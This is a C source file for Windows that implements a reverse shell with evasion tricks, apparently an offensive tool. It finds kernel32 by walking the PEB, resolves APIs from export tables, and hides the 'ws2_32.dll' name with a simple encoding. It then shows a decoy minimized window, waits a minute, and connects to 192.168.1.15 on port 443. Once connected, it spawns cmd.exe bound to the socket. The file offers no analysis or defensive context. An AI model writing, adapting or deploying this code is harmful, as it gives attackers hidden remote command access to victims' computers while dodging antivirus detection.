#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <process.h>  // _beginthreadex
#include <string.h>
#include <winternl.h>


typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;

typedef struct _TEB {
  PVOID Reserved1[12];
  PPEB  ProcessEnvironmentBlock;
  PVOID Reserved2[399];
  BYTE  Reserved3[1952];
  PVOID TlsSlots[64];
  BYTE  Reserved4[8];
  PVOID Reserved5[26];
  PVOID ReservedForOle;
  PVOID Reserved6[4];
  PVOID TlsExpansionSlots;
} TEB, *PTEB;

WSADATA wsaData;
SOCKET rev_sock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.1.15"; 
char port[6] = "443";            

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int GLOBAL_KEY = 10;


/*** function descriptors ***/
typedef int (WSAAPI *f_WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI *f_WSASocketA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef struct hostent* (WSAAPI *f_gethostbyname)(const char *name);
typedef char* (WSAAPI *f_inet_ntoa)(struct in_addr in);
typedef u_short (WSAAPI *f_htons)(u_short);
typedef unsigned long (WINAPI *f_inet_addr)(const char *);
typedef int (WSAAPI *f_WSAConnect)(SOCKET s, SOCKADDR *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS,LPQOS lpGQOS);

typedef BOOL (WSAAPI *f_CreateProcessA)(
LPCSTR                lpApplicationName,
LPSTR                 lpCommandLine,
LPSECURITY_ATTRIBUTES lpProcessAttributes,
LPSECURITY_ATTRIBUTES lpThreadAttributes,
BOOL                  bInheritHandles,
DWORD                 dwCreationFlags,
LPVOID                lpEnvironment,
LPCSTR                lpCurrentDirectory,
LPSTARTUPINFOA        lpStartupInfo,
LPPROCESS_INFORMATION lpProcessInformation
);


typedef HMODULE (WSAAPI *f_loadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WSAAPI *f_GetProcAddress)(HMODULE hModule, LPCSTR  lpProcName);

/***  End   ***/


/*** function pointers ***/
f_WSAStartup p_WSAStartup = NULL;
f_WSASocketA p_WSASocketA = NULL;
f_gethostbyname p_gethostbyname = NULL;
f_inet_ntoa p_inet_ntoa = NULL;
f_htons p_htons = NULL;
f_inet_addr p_inet_addr = NULL;
f_WSAConnect p_WSAConnect = NULL;
f_CreateProcessA p_CreateProcessA = NULL;
f_loadLibraryA p_loadLibraryA = NULL;
f_GetProcAddress p_GetProcAddress = NULL;
/***  End   ***/



/** Module handlers **/
HMODULE kernel32_handler = NULL;
HMODULE ws32_handler = NULL;

/** End **/


/** Encoding **/
char decoded_string[255];
/** End **/

char* decode(int msg[], int size){

    memset(decoded_string,0,254);
    for(int i=0; i<size && i<254; i++){
        decoded_string[i] = (char)msg[i]-GLOBAL_KEY;

    }
    return decoded_string;
}



LPVOID get_function_addr(LPVOID base_ptr, char *addressName){
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base_ptr;
    char *fbyte = (char *)&dosHeader->e_magic;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)base_ptr + dosHeader->e_lfanew);
    
    printf("Entry POINT: %p\n",ntHeaders->OptionalHeader.AddressOfEntryPoint);
    IMAGE_DATA_DIRECTORY export_data_dir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (export_data_dir.VirtualAddress == 0) {
        
        
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base_ptr + export_data_dir.VirtualAddress);
    DWORD *names = (DWORD*)((BYTE*)base_ptr + export_dir->AddressOfNames);

    WORD *ordinals = (WORD*)((BYTE*)base_ptr + export_dir->AddressOfNameOrdinals);

    DWORD *functions = (DWORD*)((BYTE*)base_ptr + export_dir->AddressOfFunctions);


    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        char *funcName = (char*)((BYTE*)base_ptr + names[i]);

        WORD ordinalIndex = ordinals[i];
        DWORD funcRva = functions[ordinalIndex];

        void *funcAddr = (BYTE*)base_ptr + funcRva;
        if(strstr(funcName, addressName)!=NULL){
            // printf("%-40s Ordinal: %u RVA: 0x%08lx VA: %p\n",
            // funcName,
            // export_dir->Base + ordinalIndex,
            // funcRva,
            // funcAddr);
            return funcAddr;
        }
        
    }
}


PVOID kernel32_resolver(){
    TEB *p_teb = (TEB *)__readgsqword(0x30);
    PEB *p_peb = NULL;
    PEB_LDR_DATA *p_ldr = NULL;

    printf("TEB address: %p\n", p_teb);
    printf("PEB address: %p\n", p_teb->ProcessEnvironmentBlock);

    p_peb = p_teb->ProcessEnvironmentBlock;
    p_ldr = p_peb->Ldr;

    
    printf("\nInspect PLDR_DATA_TABLE_ENTRY\n");
    LIST_ENTRY *curr = p_ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY *first_elem = curr;
    do{
        
        
        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)curr - (sizeof(PVOID) * 2)); //salta all'inizio della struttura PLDR_DATA_TABLE_ENTRY
        wprintf(L"DLL NAME: %.*ls\n",
            entry->FullDllName.Length / sizeof(WCHAR),
            entry->FullDllName.Buffer);
        printf("DLL Base: %p\n", entry->DllBase);
        if(wcsstr(entry->FullDllName.Buffer, L"KERNEL32.DLL")!=NULL){
            //LPVOID loadLibrary = get_function_addr(entry->DllBase, "LoadLibraryA");
            return entry->DllBase;
        }
        
        curr = entry->InMemoryOrderLinks.Flink;


    }while(curr!=first_elem);
    return NULL;
}

void load_libs(){
    

    int kernerl32enc[] = {117,111,124,120,111,118,61,60,56,110,118,118}; //kernel32.dll
    int ws32enc[] = {129,125,60,105,61,60,56,110,118,118}; //ws2_32.dll
    kernel32_handler = kernel32_resolver();
    
    if(kernel32_handler!=NULL){
        p_loadLibraryA = get_function_addr(kernel32_handler, "LoadLibraryA");
        p_GetProcAddress = get_function_addr(kernel32_handler, "GetProcAddress");

    }
    
    
    ws32_handler = p_loadLibraryA(decode(ws32enc, sizeof(ws32enc) / sizeof(ws32enc[0])));
    
    printf("LoadLibrary: %p\n", p_loadLibraryA);
    printf("GetProcAddress: %p\n", p_GetProcAddress);

}

void load_functions(){

    if(!ws32_handler){
        ExitProcess(0);
    }
    p_WSAStartup = (f_WSAStartup)p_GetProcAddress(ws32_handler, "WSAStartup");
	p_WSASocketA = (f_WSASocketA)p_GetProcAddress(ws32_handler, "WSASocketA");
	p_gethostbyname = (f_gethostbyname)p_GetProcAddress(ws32_handler, "gethostbyname");
	p_inet_ntoa = (f_inet_ntoa)p_GetProcAddress(ws32_handler, "inet_ntoa");
    p_htons = (f_htons)p_GetProcAddress(ws32_handler, "htons");
    p_inet_addr = (f_inet_addr)p_GetProcAddress(ws32_handler, "inet_addr");
    p_WSAConnect = (f_WSAConnect)p_GetProcAddress(ws32_handler, "WSAConnect");
    p_CreateProcessA = (f_CreateProcessA)p_GetProcAddress(kernel32_handler, "CreateProcessA");


}


void tiktakmf(){

    load_libs();
    load_functions();

    p_WSAStartup(MAKEWORD(2, 2), &wsaData);
    rev_sock = p_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = p_gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, p_inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = p_htons(atoi(port));
    hax.sin_addr.s_addr = p_inet_addr(ip_addr);

    p_WSAConnect(rev_sock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)rev_sock;

    TCHAR *cmd = "cmd.exe";
    printf("%s\n",cmd);
    printf("CreateProcessA: %p",p_CreateProcessA);
    p_CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
}


unsigned __stdcall ThreadFunc(void* param) {
    Sleep(60000); // 1 minuto
    tiktakmf();
    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch(msg) {
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{


    const char CLASS_NAME[] = "MinimalWindowClass";
    printf("Run\n");
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        "Minimal Window",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
        NULL, NULL, hInstance, NULL
    );

    if (!hwnd) return 0;

    ShowWindow(hwnd, nCmdShow);
    ShowWindow(hwnd, SW_MINIMIZE);
    UpdateWindow(hwnd);
    printf("Pre thread\n");

    // Avvio del thread
    uintptr_t threadHandle = _beginthreadex(NULL, 0, ThreadFunc, NULL, 0, NULL);

    // Loop dei messaggi della finestra
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    printf("Close handle\n");

    // Chiudi il thread (opzionale, il thread dovrebbe terminare da solo)
    CloseHandle((HANDLE)threadHandle);

    return (int)msg.wParam;
}



